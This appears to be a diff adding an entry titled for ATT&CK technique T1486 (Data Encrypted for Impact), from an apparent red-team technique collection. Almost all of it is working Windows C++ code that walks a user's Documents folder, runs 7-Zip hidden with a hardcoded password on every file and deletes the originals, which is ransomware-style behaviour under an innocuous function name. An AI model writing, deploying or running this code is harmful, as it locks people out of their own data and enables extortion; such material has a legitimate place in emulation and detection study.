@@ -1,0 +1,56 @@
+---
+title: "T1486.Data Encrypted for Impact "
+folder: "14. Impact"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <filesystem>
+
+namespace fs = std::filesystem;
+void secureZipFilesWithPassword(const std::string& directory, const std::string& password) {
+    for (const auto& entry : fs::recursive_directory_iterator(directory)) {
+        if (!entry.is_regular_file()) {
+            continue; 
+        } 
+
+        std::string filePath = entry.path().string();
+        std::string zipFilePath = filePath + ".zip"; // Dodaj .zip do nazwy pliku
+
+        std::string command = "\"C:\\Program Files\\7-Zip\\7z\" a -p" + password + " -sdel \"" + zipFilePath + "\" \"" + filePath + "\"";
+
+        try {
+            const char* commandPtr = command.c_str();
+
+            STARTUPINFOA si = {};
+            si.cb = sizeof(STARTUPINFOA);
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_HIDE;
+
+            PROCESS_INFORMATION pi;
+
+
+            if (CreateProcessA(NULL, const_cast<LPSTR>(commandPtr), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+                WaitForSingleObject(pi.hProcess, INFINITE);
+                CloseHandle(pi.hThread);
+                CloseHandle(pi.hProcess);
+            }
+
+        }
+        catch (...) {
+           }
+    }
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    std::string directory = "C:\\Users\\User\\Documents";
+    std::string password = "fds%E^Ssd6$QAd6ca4ds5csads21";
+    secureZipFilesWithPassword(directory, password);
+    return 0;
+}
